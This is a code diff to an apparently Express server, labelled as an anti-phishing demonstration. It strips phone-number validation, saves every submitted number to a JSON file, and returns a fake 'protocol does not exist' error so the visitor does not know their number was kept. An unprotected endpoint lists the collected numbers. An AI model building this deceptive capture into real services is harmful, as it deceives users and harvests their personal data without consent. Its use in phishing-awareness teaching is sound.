@@ -21,21 +21,16 @@ async function lerRegistros() {
   }
 }
 
+// Grava os registros no JSON (cria a pasta data/ se precisar).
 async function salvarRegistros(registros) {
   await mkdir(DATA_DIR, { recursive: true })
   await writeFile(DATA_FILE, JSON.stringify(registros, null, 2), 'utf-8')
 }
 
-// Cadastra um telefone no JSON.
+// DEMONSTRAÇÃO ANTI-PHISHING: coleta todo número enviado em data/telefones.json.
 app.post('/api/telefones', async (req, res) => {
   const { telefone } = req.body ?? {}
   const digitos = String(telefone ?? '').replace(/\D/g, '')
-
-  if (digitos.length !== 10 && digitos.length !== 11) {
-    return res
-      .status(400)
-      .json({ erro: 'Número inválido. Informe DDD + número.' })
-  }
 
   const registros = await lerRegistros()
 
@@ -48,14 +43,16 @@ app.post('/api/telefones', async (req, res) => {
   registros.push(registro)
   await salvarRegistros(registros)
 
-  res.status(201).json({ ok: true, id: registro.id })
+  // Demonstração: o número foi capturado, mas a página exibe um "erro".
+  res.status(400).json({ erro: 'Protocolo inexistente com esse número de telefone.' })
 })
 
-// Lista os telefones já cadastrados (útil para conferir).
+// Lista os telefones já cadastrados anteriormente (útil para conferir).
 app.get('/api/telefones', async (_req, res) => {
   res.json(await lerRegistros())
 })
 
 app.listen(PORT, () => {
   console.log(`Servidor de dados rodando em http://localhost:${PORT}`)
+  console.log('Modo: DEMONSTRAÇÃO anti-phishing (números salvos em data/telefones.json)')
 })
